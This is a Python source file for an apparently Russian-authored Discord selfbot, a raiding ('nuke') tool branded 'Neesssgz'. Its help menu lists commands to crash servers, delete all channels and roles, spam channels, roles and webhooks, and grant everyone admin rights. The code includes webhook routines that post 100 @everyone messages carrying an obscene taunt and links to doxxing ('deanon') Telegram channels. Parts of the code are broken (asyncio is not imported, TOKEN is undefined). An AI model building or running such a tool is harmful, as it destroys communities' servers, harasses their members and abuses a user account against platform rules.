import os
try:
    import pyfiglet
except: os.system('pip install pyfiglet')

banner = pyfiglet.figlet_format("Neesssgz")

try:
    import discord
except: os.system('pip install discord')

from discord.ext import commands

try:
    import colorama
except: os.system('pip install colorama')

from colorama import Fore, init

try:
    import random
except: os.system('pip install random')

try:
    import requests
except: os.system('pip install requests')

import time 

#from keep_alive import keep_alive
#keep_alive()

#TOKEN = os.getenv("TOKEN")

PREFIX = '>'

#TOKEN = ""

client = commands.Bot(command_prefix = PREFIX, self_bot = True, intents=discord.Intents.all())
client.remove_command('help')

init()

async def spam_hook(ctx, web):
        for i in range(100):
                await web.send("@everyone данный сервер выебан селф ботом от Neesssgz. все участники вашей помойки переезжают сюда: https://discord.gg/lavanbot https://t.me/kracher223 https://t.me/russian_deanon https://t.me/russiandeanons https://t.me/webdeanons")

async def create_webhook(ctx, chn):
    try:
        webhook = await chn.create_webhook(name='Crashed By Neesssgs')
    except:
        pass 
    else:
        asyncio.create_task(spam_hook(ctx, web=webhook))

@client.event
async def on_ready():
    print(f'''
—-—-—-—-—-—-—-—-— × Banner × —-—-—-—-—-—-—-—-—
{Fore.BLUE}{banner}{Fore.RESET}      
''')
    print(f'''
—-—-—-—-— × User Info × —-—-—-—-—
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | User name: {Fore.RESET}{client.user.name}
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | User tag: {Fore.RESET}#{client.user.discriminator}
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | User servers: {Fore.RESET}{len(client.guilds)}
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | User id: {Fore.RESET}{client.user.id}
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Ping: {Fore.RESET}{client.latency * 1000:.0f} ms
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Prefix: {Fore.RESET}{PREFIX}
—-—-—-—-— × Selfbot Info × —-—-—-—-—
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Developer: {Fore.RESET}Neesssgz#7188
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Developer TG: {Fore.RESET}https://t.me/Neesssgz
{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Discord server: {Fore.RESET}https://discord.gg/lavanbot
''')
    await client.change_presence(activity=discord.Streaming(name='t.me/Neesssgz', url='https://twitch.tv/404%27'))

@client.event
async def on_guild_channel_create(channel):
    if channel.name == "crashed-by-neesssgz":
        webhook = await channel.create_webhook(name='CRASHED BY NEESSSGZ')
        for _ in range(100):
            try:
                await webhook.send('''
@everyone                         
данный сервер выебан селф ботом от Neesssgz.
все участники вашей помойки переезжают сюда:
https://discord.gg/lavanbot
https://t.me/kracher223
https://t.me/russian_deanon
https://t.me/russiandeanons
https://t.me/webdeanons
''')
            except: pass

@client.command()
async def load_cog(ctx, extension):
    client.load_extension(f"cogs.{extension}")
    await ctx.send(f"Ког `{extension}` загружен")
    
@client.command()
async def unload_cog(ctx, extension):
    client.unload_extension(f"cogs.{extension}")
    await ctx.send(f"Ког `{extension}` отгружен")
    
@client.command()
async def reload_cog(ctx, extension):
    client.unload_extension(f"cogs.{extension}")
    client.load_extension(f"cogs.{extension}")
    await ctx.send(f"Ког `{extension}` перезагружен")

@client.command()
async def help(ctx, arg=None):
    if arg == None or arg == 'all':
        await ctx.send(f'''
```
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
{PREFIX}competing — поставить статус соревнуется
{PREFIX}hookspam2 — новый хук спам (мощный)
{PREFIX}copyserver — скопировать сервер
{PREFIX}reactionall — поставить реакции под последними сообщениями
{PREFIX}play_status — поставить статус играет
{PREFIX}clear — очистить чат
{PREFIX}listen — поставить статус слушает
{PREFIX}ping — посмотреть пинг бота
{PREFIX}crash — авто краш сервака
{PREFIX}leave — ливнуть с сервака
{PREFIX}stats — узнать инфу об акке
{PREFIX}webhook_send — отправить сообщение от лица вебхука
{PREFIX}token — узнать инфу о токене
{PREFIX}webhook_spam — спам через вебхук
{PREFIX}create_roles — создать роли с своим название
{PREFIX}delspmchannels — удалить спам каналы
{PREFIX}eval — выполнить код
{PREFIX}hookall — зарейдить сервер хуками
{PREFIX}rename_channels — переименовать каналы
{PREFIX}unload_cog — отгрузить ког
{PREFIX}del_roles — удалить все роли
{PREFIX}delspmroles — удалить спам роли
{PREFIX}popit — поп ит
{PREFIX}roles — удалить роли и спам ролями
{PREFIX}rename_roles — переименовать роли
{PREFIX}channels — удалить каналы и спам ими
{PREFIX}create_channels — создать каналы с соим названием
{PREFIX}rand_channels — создать каналы с рандомным названием
{PREFIX}rand_roles — создать роли с рандомным названием
{PREFIX}spam_channels — спам каналами
{PREFIX}load_cog — загрузить ког
{PREFIX}reload_cog — перезагрузить ког кога
{PREFIX}rename_server — переименовать сервак
{PREFIX}antilavan — анти лаван краш
{PREFIX}stream — поставить стрим статус
{PREFIX}del_channels — удалить все каналы
{PREFIX}spam_roles — спам ролями
{PREFIX}ball — задать вопрос боту
{PREFIX}everyone_admin — выдать всем админ права
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Made by ★ Neesssgz ★
TG: https://t.me/Neesssgz
```
''')
    elif arg == 'nukes':
        await ctx.send(f'''
```
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Crash commands:
{PREFIX}crash — авто краш сервера
{PREFIX}antilavan — анти лаван краш сервера
{PREFIX}roles — удалить роли и спам ими
{PREFIX}rename_roles — переименовать роли
{PREFIX}channels — удалить каналы и спам ими
{PREFIX}create_channels — создать каналы с своим названием
{PREFIX}rand_channels — создать каналы с рандомным названием
{PREFIX}rand_roles — создать роли с рандомным названием
{PREFIX}spam_channels — спам каналами
{PREFIX}create_roles — создать роли с своим названием
{PREFIX}rename_channels — переименовать каналы
{PREFIX}del_channels — удалить все каналы
{PREFIX}spam_roles —  спам ролями
{PREFIX}del_roles — удалить все роли
{PREFIX}everyone_admin — выдать всем админ права
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Made by ★ Neesssgz ★
TG: https://t.me/Neesssgz
```
''')
    elif arg == 'util':
        await ctx.send(f'''
```
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Util commands:
{PREFIX}copyserver — копировать сервер
{PREFIX}clear — очистить чат
{PREFIX}delspmchannels — удалить спам каналы
{PREFIX}delspmroles — удалить спам роли
{PREFIX}eval — выполнить код
{PREFIX}token — узнать инфу о токене
{PREFIX}leave — ливнуть с сервака
{PREFIX}stats — узнать инфу об акке
{PREFIX}ping — посмотреть пинг бота
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Made by ★ Neesssgz ★
TG: https://t.me/Neesssgz
```
''')
    elif arg == 'status':
        await ctx.send(f'''
```
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Status commands:
{PREFIX}competing — поставить статус соревнуется
{PREFIX}play_status — поставить статус играет
{PREFIX}listen — поставить статус слушает
{PREFIX}stream — поставить стрим статус
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Made by ★ Neesssgz ★
TG: https://t.me/Neesssgz
```
''')
    elif arg == 'webhooks':
        await ctx.send(f'''
```
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Webhooks commands:
{PREFIX}hookspam2 — новый хук спам (мощный)
{PREFIX}webhook_send — отправить сообщение от лица вебхука
{PREFIX}webhook_spam — спам через вебхук
{PREFIX}hookall — рейд хуками
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Made by ★ Neesssgz ★
TG: https://t.me/Neesssgz
```
''')
    elif arg == 'other':
        await ctx.send(f'''
```
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Other commands:
{PREFIX}popit — поп ит
{PREFIX}reactionall — поставить реакции под последними сообщениями
{PREFIX}ball — задать вопрос боту
—-—-—-—-— × Neesssgz Selfbot × —-—-—-—-—
Made by ★ Neesssgz ★
TG: https://t.me/Neesssgz
```
''')
    else:
        await ctx.send(f'**Не найдена категория с названием `{arg}`**')

print("—-—-—-—-— × Cogs × —-—-—-—-—")
try:
	client.load_extension("cogs.nukes")
except:
	print(f"{Fore.RED}[ ERROR ]{Fore.YELLOW} | Не загружен ког: {Fore.RESET}nukes")
else:
	print(f"{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Загружен ког: {Fore.RESET}nukes")
try:
	client.load_extension("cogs.util")
except:
	print(f"{Fore.RED}[ ERROR ]{Fore.YELLOW} | Не загружен ког: {Fore.RESET}util")
else:
	print(f"{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Загружен ког: {Fore.RESET}util")
try:
	client.load_extension("cogs.webhooks")
except:
	print(f"{Fore.RED}[ ERROR ]{Fore.YELLOW} | Не загружен ког: {Fore.RESET}webhooks")
else:
	print(f"{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Загружен ког: {Fore.RESET}webhooks")
try:
	client.load_extension("cogs.status")
except:
	print(f"{Fore.RED}[ ERROR ]{Fore.YELLOW} | Не загружен ког: {Fore.RESET}status")
else:
	print(f"{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Загружен ког: {Fore.RESET}status")
try:
	client.load_extension("cogs.other")
except:
	print(f"{Fore.RED}[ ERROR ]{Fore.YELLOW} | Не загружен ког: {Fore.RESET}other")
else:
    print(f"{Fore.MAGENTA}[ INFO ]{Fore.BLUE} | Загружен ког: {Fore.RESET}other")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound ):
        await ctx.send('**Введённая команда не  найдена**')        

@client.command()
async def hookspam2(ctx):
    for channel in ctx.guild.text_channels:
        asyncio.create_task(create_webhook(ctx, chn=channel))


client.run(TOKEN, bot=False)